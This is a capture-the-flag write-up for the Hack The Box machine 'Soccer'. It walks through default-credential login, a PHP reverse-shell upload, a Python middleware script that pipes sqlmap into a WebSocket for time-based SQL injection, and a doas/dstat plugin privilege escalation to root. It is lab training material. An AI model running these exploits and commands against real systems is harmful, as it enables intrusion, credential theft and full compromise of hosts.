# Soccer - HTB
### Difficulty level: Easy
------------------------------------------------------

Let's start with nmap scan:
```bash
nmap -sV -sC 10.10.11.194 | tee nmap/nmap.scan
```

Results:
```bash
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 04 May 2023 14:40:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 04 May 2023 14:40:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 04 May 2023 14:40:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=5/4%Time=6453C3D4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Thu,\x2004\x20May\x202023\x2014:40:26\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Thu,\x2004\x20May\x202023\x2014:40:26\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Thu,\x
SF:2004\x20May\x202023\x2014:40:27\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It seem like it's a Linux machine, 3 open ports - SSH (22), HTTP (80) and WebSocket (9091).

I'll investigate the HTTP service,

First, I'll add the domain "soccer.htb" to the "/etc/hosts" file:
```bash
sudo echo "10.10.11.194    soccer.htb" >> /etc/hosts
```
This is the first page, there is nothing interesting over here.

![image](https://user-images.githubusercontent.com/114166939/236629321-e9371f94-d9a4-4aab-abbf-f7636a0660fc.png)

I'll run a gobuster scan to find hidden directories:
```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster.scan
```

Results:
```bash
/tiny (Status: 301)
```

A quick look at this page reveals a login page called "Tiny File Manager".


![image](https://user-images.githubusercontent.com/114166939/236629726-1ca1c9c9-91d4-4d7d-ae43-778c682fd966.png)


At the bottom of the page there is a link to the github page "https://tinyfilemanager.github.io/":

![image](https://user-images.githubusercontent.com/114166939/236630077-00e8ea3c-1c83-477f-a19c-ff04ef1a74ce.png)

Click on the "Github" option and we find the github repository for this page.

There are 2 default users in the README.md file

![image](https://user-images.githubusercontent.com/114166939/236630206-e66d49a7-2693-4231-8edb-8524ecf5bb7e.png)

Let's check the admin credentials - "admin : admin@123":

![image](https://user-images.githubusercontent.com/114166939/236630361-262a29f2-9368-4440-a6c3-2609ef28381e.png)

Admin user logged-in!

I'll use the "Upload" option and let's try to get a reverse shell with php script written by "pentestmonkey" from "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet".

First, I'll modify the IP and PORT variables.

Next, save the file and upload it to the "Upload" page:

![image](https://user-images.githubusercontent.com/114166939/236663601-fdb66e79-6803-466f-9683-51a23c0b19a4.png)

The file was successfully uploaded!

Let's go back to the main page, enter the "tiny" folder, "uploads", find the reverse shell file we just uploaded.

Before entering the location it is located, I'll establish a net-cat listener from my machine (port 3389 in my case):

```bash
nc -lnvp 3389
```

Now, click on the "Direct link" option in the Actions section:

Got a reverse shell!


![image](https://user-images.githubusercontent.com/114166939/236664405-96fb54f9-91a9-4c2c-92d7-6483bb872166.png)

I'll upgrade this "sh" shell for better "bash" shell with the commands:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
stty rows 38 columns 116
```

The current user is "www-data", the default user for web servers.

This user has no special files, permissions, or other interesting directories, so let's investigate the basic files:

```bash
cat /etc/passwd
```

There are 2 users on this machine, "root" and "player".

![image](https://user-images.githubusercontent.com/114166939/236664668-1f43ebbe-99d7-4c6d-b174-629eba1d4acf.png)

In his home directory there is the first flag, user.txt, owned by root and "player" group.

![image](https://user-images.githubusercontent.com/114166939/236664754-260a09cc-ebd8-44d5-beed-ff39bab000b7.png)

"hosts" is another file located in the "/etc" directory. It needs to be configured to add hosts to the DNS map of the machine (by IP and domain).

```bash
cat /etc/hosts
```

![image](https://user-images.githubusercontent.com/114166939/236664998-a5484a15-d71a-4351-b522-665fbc266aee.png)

This is interesting. There is a sub-domain of the HTTP server I didn't see before in this challenge.

Before I'll enter this sub-domain in my browser I also need to configure it in my "/etc/hosts":

```bash
sudo nano /etc/hosts
```

And add "soc-player.soccer.htb" next to "soccer.htb".


![image](https://user-images.githubusercontent.com/114166939/236665337-41813ccb-83a9-4b21-afbb-87557f6bd252.png)

When I opened this sub-domain, it looks the same as "soccer.htb" except for the "Match & Login & Signup" pages:

![image](https://user-images.githubusercontent.com/114166939/236665427-8a44ce54-87ba-4c05-80b8-61863384c564.png)

On the "Match" page find this line:

![image](https://user-images.githubusercontent.com/114166939/236665503-af6fc85c-0ad7-4bf7-a4e4-16a69d9e7564.png)

Okay! Let's register on the "Signup" page:

![image](https://user-images.githubusercontent.com/114166939/236665540-b3d4400e-1b90-42ec-b15e-f14cd9780aef.png)

```
mail: test@test.com
password: test
```

I'll log-in with this user.

Got the "check" directory:

![image](https://user-images.githubusercontent.com/114166939/236665742-f2424bb0-60d6-402b-bf28-c02a6bcdd827.png)

Let's see the HTML code of this page and see how it checks if I got the correct ticket.

I found the following JavaScript code:

![image](https://user-images.githubusercontent.com/114166939/236665872-da26448a-0b31-4bec-b228-797443a6ea10.png)

The first thing to notice is the first line in the code:
```JavaScript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
```
It communicates with a Web socket to check the ticket.

The same Web-Socket appeared at port 9091 during the nmap scan!

I'll search for a vulnerability in the user input that relates to a Web-Socket.

The first link when I search for "sqli web socket" is the following:

 "https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html".

There is a python script which is a MITM type that connects the "sqlmap" tool to the Web-Socket.

Let's try it!

I'll take the python script and modify the "ws_server" and "data" variables.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"ID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

I'll run this script on my machine:
```bash
python3 exp.py
```

![image](https://user-images.githubusercontent.com/114166939/236666407-9587581b-f933-4f00-98fa-c6c324534340.png)

And the next thing I'll do is run the "sqlmap" tool with the command:
```bash
sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
```

It took a while, but it found a Time-Based SQLi and dumped all data-bases from the web-socket:

![image](https://user-images.githubusercontent.com/114166939/236666548-a1109d2a-4290-4591-8906-5bb24b1110b2.png)

I'll dump all information from "soccer_db" with the "sqlmap" command:
```bash
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --dump-all
```
![image](https://user-images.githubusercontent.com/114166939/236667094-3c700a36-a645-4ff5-abe2-55ceb79ee826.png)


Find the credentials of the "player" user with a plain-text password!

I'll use them and switch from the "www-data" to the "player" user:

![image](https://user-images.githubusercontent.com/114166939/236667307-343aa2d3-4352-4f30-8d64-8fe077b8c67f.png)

Connected to the "player" user!

Let's get the first flag:

![image](https://user-images.githubusercontent.com/114166939/236667373-cea4e0da-941b-4d82-aeec-e1c84343b96f.png)

The next step is privilege escalation!

I will search for SUID files owned by root so I can run them as root and manipulate the system.

```bash
find / -user root -perm /4000 2>/dev/null
```
Results:

![image](https://user-images.githubusercontent.com/114166939/236667755-8e4ca423-2e27-4e71-b55c-06295379c909.png)

Most binary files are not manipulated for privilege-escalation except for the "doas" binary.

This command is similar to "sudo", it can run files and programs as another user!

It has a configuration file called "doas.conf".

Let's examine it with the following:
```bash
find / -type f -name doas.conf 2>/dev/null
```

Results:

![image](https://user-images.githubusercontent.com/114166939/236668060-4efb09d0-754a-4b2b-86a4-9a62a2506f1c.png)

I'll print this file:

![image](https://user-images.githubusercontent.com/114166939/236668141-e6a99960-4d01-4bef-bdf4-39051e4f4b61.png)

Which means I am able to run the file "/usr/bin/dstat".

I'll search for "dstat" at "https://gtfobins.github.io/":

Under "dsata" category I found the following:

![image](https://user-images.githubusercontent.com/114166939/236668296-4fe8f156-73fe-42a5-b972-343db2436184.png)

Let's find a directory in which I can write to files:
```bash
find / -type d -user player -perm /g+w 2>/dev/null | grep dstat*
```
Found nothing.

```bash
find / -type d -group player -perm /g+w 2>/dev/null | grep dstat*
```

Results:

![image](https://user-images.githubusercontent.com/114166939/236668559-fcb947c5-4f69-4ce7-94d2-99da197add16.png)

![image](https://user-images.githubusercontent.com/114166939/236668795-a04ed798-9a76-4eca-b1f6-b35258f23424.png)


This directory is the fourth at GTFOBins and we have read, write and execute permissions. Let's move on to the next step:

![image](https://user-images.githubusercontent.com/114166939/236668994-1950a715-b151-4438-b2de-642880d506f8.png)

I'll modify the commands:
(doas instead of sudo)

```bash
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xyz.py

doas -u root /usr/bin/dstat --xyz
```
Run these commands and you've got a root user!

![image](https://user-images.githubusercontent.com/114166939/236669359-df9ff7f7-919a-4b01-98e4-d80ac5c5c584.png)

Let's get the second and final flag, root.txt, located in root's home directory:

![image](https://user-images.githubusercontent.com/114166939/236669486-8243e87e-8188-4af7-97ac-967574b4eac2.png)
